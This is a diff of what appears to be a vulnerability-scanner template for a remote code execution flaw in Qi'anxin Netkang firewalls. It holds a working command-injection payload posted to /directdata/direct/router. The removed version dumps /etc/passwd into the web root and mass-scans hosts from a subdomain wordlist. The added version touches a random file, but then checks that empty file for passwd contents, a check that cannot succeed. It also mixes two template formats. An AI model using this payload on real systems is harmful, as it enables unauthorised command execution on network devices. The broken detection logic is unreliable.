@@ -1,37 +1,28 @@
 id: qi-anxin-netkang-next-generation-firewall-rce
 
 info:
-  name: Qi'anxin Netkang Next Generation Firewall RCE
+  name: Qi'anxin Netkang Next Generation Firewall - Remote Code Execution
   author: pikpikcu
   severity: critical
-  reference: https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
-  tags: rce
+  description: |
+    Qi'anxin Netkang Next Generation Firewall is susceptible to remote code execution.
+  reference:
+    - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
 
-requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
+set:
+    randstr: randomLowercase(20)
+rules:
+    r0:
+        request:
+            method: POST
+            path: /directdata/direct/router
+            body: |
+                {"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;touch /var/www/html/{{randstr}}.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}
+        expression: response.status == 200
+    r1:
+        request:
+            method: GET
+            path: /{{randstr}}.txt
+        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: r0() && r1()
 
-    raw:
-      - |
-        POST /directdata/direct/router HTTP/1.1
-        Host: {{Subdomains}}
-        Content-Length: 178
-        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
-
-        {"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;cat /etc/passwd >/var/www/html/poc.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}
-      - |
-        GET /poc.txt HTTP/1.1
-        Host: {{Subdomains}}
-        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
-    matchers-condition: and
-    matchers:
-      - type: regex
-        regex:
-          - "root:.*:0:0"
-        part: body
-
-      - type: status
-        status:
-          - 200
